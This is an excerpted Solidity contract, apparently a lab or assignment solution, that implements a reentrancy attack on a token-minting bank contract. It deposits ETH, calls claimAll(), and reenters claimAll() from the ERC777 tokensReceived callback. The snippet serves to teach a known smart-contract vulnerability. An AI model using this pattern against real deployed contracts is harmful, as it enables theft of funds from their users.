...
contract Attacker is AccessControl, IERC777Recipient {
	...
	function attack(uint256 amt) payable public {
      require( address(bank) != address(0), "Target bank not set" );
		//YOUR CODE TO START ATTACK GOES HERE
       	// First, deposit ETH to get a balance in the bank
        bank.deposit{value: amt}();
        
        // Then call claimAll() which will mint MCITR tokens and send them to this contract
        // This will trigger the tokensReceived callback where we can reenter
        bank.claimAll();		
	}
	...
	*/
	function tokensReceived(
        ...
        // If we haven't reached max depth, reenter by calling claimAll again
        if (depth < max_depth) {
            depth++;
            emit Recurse(depth);
            bank.claimAll();
